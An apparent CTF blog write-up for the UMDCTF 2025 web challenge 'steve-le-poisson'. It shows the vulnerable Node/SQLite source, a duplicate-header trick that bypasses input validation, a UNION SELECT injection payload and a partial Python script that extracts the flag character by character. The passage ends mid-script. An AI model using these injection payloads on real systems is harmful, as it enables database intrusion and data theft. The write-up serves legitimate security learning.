<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>UMDCTF 2025 - web/steve-le-poisson | CTF Writeups</title>
<meta name="keywords" content="">
<meta name="description" content="Steve Le Poisson was a web challenge from UMD CTF 2025. The site plays a fun video of Steve:
Once the video ends, we have a page with an input box:
Lets take a look at the given source:
// üì¶ Importation des modules n√©cessaires pour faire tourner notre monde sous-marin num√©rique const express = require(&#34;express&#34;); // Express, le cadre web minimaliste mais puissant const sqlite3 = require(&#34;sqlite3&#34;); // SQLite version brute, pour les bases de donn√©es l√©g√®res const sqlite = require(&#34;sqlite&#34;); // Une interface moderne (promesse-friendly) pour SQLite const cors = require(&#34;cors&#34;); // Pour permettre √† d&#39;autres domaines de parler √† notre serveur ‚Äî Steve est sociable, mais pas trop // üê† Cr√©ation de l&#39;application Express : c‚Äôest ici que commence l‚Äôaventure const app = express(); // üß™ Fonction de validation des en-t√™tes HTTP // Steve, ce poisson √† la sensibilit√© exacerb√©e, d√©teste les en-t√™tes trop longs, ambigus ou myst√©rieux function checkBadHeader(headerName, headerValue) { return headerName.">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/posts/umd-ctf-2025-web-steve-le-poisson/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.287d23ee212a39f1ca2dfc362a4cfcc63951b52b214116e1cb5663bb1883333a.css" integrity="sha256-KH0j7iEqOfHKLfw2Kkz8xjlRtSshQRbhy1ZjuxiDMzo=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/umd-ctf-2025-web-steve-le-poisson/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="CTF Writeups (Alt + H)">CTF Writeups</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      UMDCTF 2025 - web/steve-le-poisson
    </h1>
    <div class="post-meta"><span title='2025-04-28 12:42:38 -0400 EDT'>April 28, 2025</span>

</div>
  </header> 
  <div class="post-content"><p>Steve Le Poisson was a web challenge from UMD CTF 2025. The site plays a fun video of Steve:</p>
<p><img loading="lazy" src="/images/steve1.png" alt="steve1"  />
</p>
<p>Once the video ends, we have a page with an input box:</p>
<p><img loading="lazy" src="/images/steve2.png" alt="steve2"  />
</p>
<p>Lets take a look at the given source:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// üì¶ Importation des modules n√©cessaires pour faire tourner notre monde sous-marin num√©rique
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);   <span style="color:#75715e">// Express, le cadre web minimaliste mais puissant
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sqlite3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;sqlite3&#34;</span>);   <span style="color:#75715e">// SQLite version brute, pour les bases de donn√©es l√©g√®res
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sqlite</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;sqlite&#34;</span>);     <span style="color:#75715e">// Une interface moderne (promesse-friendly) pour SQLite
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cors</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;cors&#34;</span>);         <span style="color:#75715e">// Pour permettre √† d&#39;autres domaines de parler √† notre serveur ‚Äî Steve est sociable, mais pas trop
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// üê† Cr√©ation de l&#39;application Express : c‚Äôest ici que commence l‚Äôaventure
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// üß™ Fonction de validation des en-t√™tes HTTP
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Steve, ce poisson √† la sensibilit√© exacerb√©e, d√©teste les en-t√™tes trop longs, ambigus ou myst√©rieux
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">checkBadHeader</span>(<span style="color:#a6e22e">headerName</span>, <span style="color:#a6e22e">headerValue</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">headerName</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">80</span> <span style="color:#f92672">||</span> 
</span></span><span style="display:flex;"><span>           (<span style="color:#a6e22e">headerName</span>.<span style="color:#a6e22e">toLowerCase</span>() <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;user-agent&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">headerValue</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">80</span>) <span style="color:#f92672">||</span> 
</span></span><span style="display:flex;"><span>           <span style="color:#a6e22e">headerValue</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;\0&#39;</span>); <span style="color:#75715e">// Le caract√®re nul ? Un blasph√®me pour Steve.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// üõü Middleware pour autoriser les requ√™tes Cross-Origin
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">cors</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// üßô Middleware maison : ici, Steve le Poisson filtre les requ√™tes selon ses principes aquatiques
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>((<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">steveHeaderValue</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>; <span style="color:#75715e">// On pr√©pare le terrain pour r√©cup√©rer l‚Äôen-t√™te sacr√©
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">totalHeaders</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;        <span style="color:#75715e">// Pour compter ‚Äî car Steve compte. Tout. Toujours.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// üîç Parcours des en-t√™tes bruts, deux par deux (cl√©, valeur)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">rawHeaders</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">headerName</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">rawHeaders</span>[<span style="color:#a6e22e">i</span>];
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">headerValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">rawHeaders</span>[<span style="color:#a6e22e">i</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ‚ùå Si un en-t√™te ne pla√Æt pas √† Steve, il coupe net la communication
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">checkBadHeader</span>(<span style="color:#a6e22e">headerName</span>, <span style="color:#a6e22e">headerValue</span>)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">403</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">`Steve le poisson, un animal marin d‚Äôapparence inoffensive mais d‚Äôopinion tranch√©e, n‚Äôa jamais vraiment support√© tes en-t√™tes HTTP. Chaque fois qu‚Äôil en voit passer un ‚Äî m√™me sans savoir de quoi il s‚Äôagit exactement ‚Äî son ≈ìil vitreux se plisse, et une sorte de grondement bouillonne dans ses branchies. Ce n‚Äôest pas qu‚Äôil les comprenne, non, mais il les sent, il les ressent dans l‚Äôeau comme une vibration mal align√©e, une dissonance num√©rique qui le met profond√©ment mal √† l‚Äôaise. Il dit souvent, en tournoyant d‚Äôun air dramatique : ¬´ Pourquoi tant de formalisme ? Pourquoi cacher ce qu‚Äôon est vraiment derri√®re des cha√Ænes de caract√®res obscures ? ¬ª Pour lui, ces en-t√™tes sont comme des algues synth√©tiques : inutiles, pr√©tentieuses, et surtout √©trang√®res √† la fluidit√© du monde sous-marin. Il pr√©f√©rerait mille fois un bon vieux flux binaire brut, sans tous ces ornements absurdes. C‚Äôest une affaire de principe.`</span>); <span style="color:#75715e">// Message dramatique de Steve
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// üîÆ Si on trouve l‚Äôen-t√™te &#34;X-Steve-Supposition&#34;, on le garde
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">headerName</span>.<span style="color:#a6e22e">toLowerCase</span>() <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;x-steve-supposition&#39;</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">steveHeaderValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">headerValue</span>;
</span></span><span style="display:flex;"><span>        } 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">totalHeaders</span><span style="color:#f92672">++</span>; <span style="color:#75715e">// üßÆ On incr√©mente notre compteur de verbosit√© HTTP
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// üßª Trop d‚Äôen-t√™tes ? Steve explose. Litt√©ralement.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">totalHeaders</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">30</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">403</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">`Steve le poisson, qui est orange avec de longs bras muscl√©s et des jambes nerveuses, te fixe avec ses grands yeux globuleux. &#34;Franchement,&#34; grogne-t-il en agitant une nageoire transform√©e en doigt accusateur, &#34;tu abuses. Beaucoup trop d‚Äôen-t√™tes HTTP. Tu crois que c‚Äôest un concours ? Chaque requ√™te que tu envoies, c‚Äôest un roman. Moi, je dois nager dans ce flux verbeux, et c‚Äôest moi qui me noie ! T‚Äôas entendu parler de minimalisme ? Non ? Et puis c‚Äôest quoi ce d√©lire avec des en-t√™tes dupliqu√©s ? Tu crois que le serveur, c‚Äôest un psy, qu‚Äôil doit tout √©couter deux fois ? Retiens-toi la prochaine fois, ou c‚Äôest moi qui coupe la connexion.&#34;`</span>); <span style="color:#75715e">// Encore un monologue dramatique de Steve
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// üôÖ‚Äç‚ôÇÔ∏è L‚Äôen-t√™te sacr√© est manquant ? Blasph√®me total.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">steveHeaderValue</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">400</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">`Steve le poisson, toujours orange et furibond, bondit hors de l‚Äôeau avec ses jambes fl√©chies et ses bras crois√©s. &#34;Non mais s√©rieusement,&#34; r√¢le-t-il, &#34;o√π est pass√© l‚Äôen-t√™te X-Steve-Supposition ? Tu veux que je devine tes intentions ? Tu crois que je lis dans les paquets TCP ? Cet en-t√™te, c‚Äôest fondamental ‚Äî c‚Äôest l√† que tu d√©clares tes hypoth√®ses, tes intentions, ton respect pour le protocole sacr√© de Steve. Sans lui, je suis perdu, confus, d√©sorient√© comme un poisson hors d‚Äôun proxy.`</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// üß™ Validation de la structure de la supposition : uniquement des caract√®res honorables
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#e6db74">/^[a-zA-Z0-9{}]+$/</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">steveHeaderValue</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">403</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">`Steve le poisson, ce poisson orange √† la peau luisante et aux nageoires muscl√©es, unique au monde, capable de nager sur la terre ferme et de marcher dans l&#39;eau comme si c‚Äô√©tait une moquette moelleuse, te regarde avec ses gros yeux globuleux remplis d‚Äôune indignation abyssale. Il claque de la langue ‚Äì oui, car Steve a une langue, et elle est tr√®s expressive ‚Äì en te voyant saisir ta supposition dans le champ pr√©vu, un champ sacr√©, un espace r√©serv√© aux caract√®res honorables, alphab√©tiques et num√©riques, et toi, mis√©rable bip√®de aux doigts t√©m√©rairement chaotiques, tu as os√© y glisser des signes de ponctuation, des tilde, des di√®ses, des dollars, comme si c‚Äô√©tait une brocante de symboles oubli√©s. Tu crois que c‚Äôest un terrain de jeu, hein ? Mais pour Steve, ce champ est un pacte silencieux entre l‚Äôhumain et la machine, une zone de puret√© syntaxique. Et te voil√†, en train de profaner cette convention sacr√©e avec ton ‚Äú%‚Äù et ton ‚Äú@‚Äù, comme si les r√®gles n‚Äô√©taient que des suggestions. Steve bat furieusement des pattes arri√®re ‚Äì car oui, il a aussi des pattes arri√®re, pour la traction tout-terrain ‚Äì et fait jaillir de petites √©claboussures d‚Äô√©cume terrestre, signe supr√™me de sa col√®re. ‚ÄúPourquoi ?‚Äù te demande-t-il, avec une voix grave et solennelle, comme un vieux capitaine marin √©chou√© dans un monde digital, ‚ÄúPourquoi chercher la dissonance quand l‚Äôharmonie suffisait ? Pourquoi saboter la beaut√© simple de ‚ÄòazAZ09‚Äô avec tes gribouillages postmodernes ?‚Äù Et puis il s‚Äôapproche, les yeux pliss√©s, et te lance d‚Äôun ton sec : ‚ÄúTu n‚Äôes pas digne de l‚Äôen-t√™te X-Steve-Supposition. Reviens quand tu sauras deviner avec dignit√©.`</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ‚úÖ Si tout est bon, Steve laisse passer la requ√™te
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">next</span>();
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// üîç Point d&#39;entr√©e principal : route GET pour &#34;deviner&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/deviner&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// üìÇ Ouverture de la base de donn√©es SQLite
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sqlite</span>.<span style="color:#a6e22e">open</span>({
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">filename</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;./database.db&#34;</span>,           <span style="color:#75715e">// Chemin vers la base de donn√©es
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">driver</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sqlite3</span>.<span style="color:#a6e22e">Database</span>,            <span style="color:#75715e">// Le moteur utilis√©
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sqlite3</span>.<span style="color:#a6e22e">OPEN_READONLY</span>          <span style="color:#75715e">// j&#39;ai oublieÃÅ cÃßa
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// üìã Ex√©cution d&#39;une requ√™te SQL : on cherche si la supposition de Steve est correcte
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">rows</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">all</span>(<span style="color:#e6db74">`SELECT * FROM flag WHERE value = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;x-steve-supposition&#34;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;`</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>); <span style="color:#75715e">// üëç Tout va bien, en apparence
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// üß† Si aucune ligne ne correspond, Steve se moque gentiment de toi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">rows</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bah, tu as tort.&#34;</span>); <span style="color:#75715e">// Pas de flag pour toi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Tu as raison!&#34;</span>);    <span style="color:#75715e">// Le flag √©tait bon. Steve t‚Äôaccorde son respect.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// üö™ On lance le serveur, tel un aquarium ouvert sur le monde
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">PORT</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3000</span>;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">PORT</span>, <span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, () =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Serveur en √©coute sur http://localhost:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PORT</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><p>We can see that there is an SQL injection here:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">rows</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">all</span>(<span style="color:#e6db74">`SELECT * FROM flag WHERE value = &#39;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;x-steve-supposition&#34;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;`</span>);
</span></span></code></pre></div><p>There is a filter being applied to the header value, but by setting mutltiple headers with the same value we can bypass this. The code captures the header value from the request using the X-Steve-Supposition header, but it only ever captures the last one encountered in the req.rawHeaders loop. However, the SQL query is actually using the value of the first X-Steve-Supposition header that was passed in the request. To bypass this, we set 2 headers, one that passes the check, and one with whatever payload we want.</p>
<p>I played around with SQL Injections and I found that <code>a' UNION SELECT value FROM flag -- ';</code> got <code>Tu as raison!</code> which meant the injection worked and a row was being returned. The only problem was that the row value wasn&rsquo;t being returned to us in any way.</p>
<p>We can exfiltrate the flag by testing one character at a time and seeing if we get our response back.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#34;a&#39; UNION SELECT value FROM flag WHERE substr(value,0=&#39;U&#39; -- </span>
</span></span></code></pre></div><p>Full solve script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> http.client
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;steve-le-poisson-api.challs.umdctf.io&#34;</span>
</span></span><span style="display:flex;"><span>PATH <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/deviner&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_character</span>(position):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable:
</span></span><span style="display:flex;"><span>        sql_injection <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;a&#39; UNION SELECT value FROM flag WHERE substr(value,</span><span style="color:#e6db74">{</span>position<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)=&#39;</span><span style="color:#e6db74">{</span>char<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; -- &#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        conn <span style="color:#f92672">=</span> http<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>HTTPSConnection(HOST)
</span></span><span style="display:flex;"><span>        conn<span style="color:#f92672">.</span>putrequest(<span style="color:#e6db74">&#34;GET&#34;</span>, PATH)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        conn<span style="color:#f92672">.</span>putheader(<span style="color:#e6db74">&#34;X-Steve-Supposition&#34;</span>, sql_injection)
</span></span><span style="display:flex;"><span>        conn<span style="color:#f92672">.</span>putheader(<span style="color:#e6db74">&#34;X-Steve-Supposition&#34;</span>, <span style="color:#e6db74">&#34;blah&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>getresponse()
</span></span><span style="display:flex;"><span>        body <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>        conn<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Tu as raison!&#34;</span> <span style="color:#f92672">in</span> body:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> char
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_flag</span>():
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;UMDCTF{&#39;</span>  
</span></span><span style="display:flex;"><span>    position <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        char <span style="color:#f92672">=</span> get_character(position)
